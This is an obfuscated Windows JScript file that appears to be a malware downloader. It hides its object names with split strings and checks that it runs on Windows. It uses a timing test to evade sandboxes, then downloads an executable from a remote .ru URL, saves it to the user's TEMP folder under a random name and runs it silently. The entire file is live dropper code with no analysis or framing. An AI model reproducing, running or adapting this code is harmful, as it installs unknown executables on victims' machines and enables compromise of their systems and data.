var QE = false;
var RK = "Create"+"Object";
var QU = function J() {return WScript[RK]("WScript"+".Shell");}(), TI = 11;
var F0 = "MSXML2"+".XMLHTTP";
var XG = 2;
var Y = XG - 2;
function BE(O1){QU["Run"](O1, Y, Y);};
function CX(){return F0 + "";};
function A(BL, U){Y = Y * 1; return BL - U;};
function IQ(){return RK;};
/*@cc_on
  @if (@_win32 || @_win64)
    QE = true;
  @end
@*/
if (QE)
{
var F = "";
function UR(){return 22;};
var QY = 0; var L = 0;
function G()
{
var AT = new this["Date"]();
var LS = AT["getUTCMilliseconds"]();
WScript["Sleep"](UR());
var AT = new this["Date"]();
var X0 = AT["getUTCMilliseconds"]();
WScript["Sleep"](UR());
var AT = new this["Date"]();
var MF = AT["getUTCMilliseconds"]();
var QY = "SF";
QY = A(X0, LS);
var L = "FX";
L = A(MF, X0);
F = "open";
return A(QY, L);
}
var MS = false;
var LT = false;
for (var Z = Y; Z < UR() * 1; Z++){if (G() != Y){
MS = true; 
L = "31" + 11 * QY + L; 
LT = true; 
break;
}}
function Q() {return ((MS == true) && (MS == LT)) ? 1 : Y;};
if (MS && Q() && LT){
function O() {return QU["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "gjuDirSSX6CAyb.ex" + "e";};
 XG0 = CX();
 T = WScript[RK](XG0);
 var M = 1;
do { 
	for (;M;){
	try {
		if (M == 1)
		{
			T[F]("GET", "http://jafes.ru/b0ros", false);
			T["send"]();
			M0 = "Sleep";
			M = 2;
		}
		WScript[M0](UR() + 120); 
		if (T["readystate"] < 2 * 2) continue;
		M = Y;
		function O0(X) {var WA = (1, 2, 3, 4, 5, X); return WA;};
		SE = WScript[IQ()]("ADODB.Stream");
		XG0 = SE;
		XG0[F]();
		XG0["type"] = O0(1);
		XG0["write"](T["ResponseBody"]);
		SE["position"] = O0(Y);
		XG0["Save" + "ToFile"](O(), 2);
		SE["cl"+"ose"]();
		E = O();
		BE(E);
	} catch(A0){};};
}while (M);
}
}

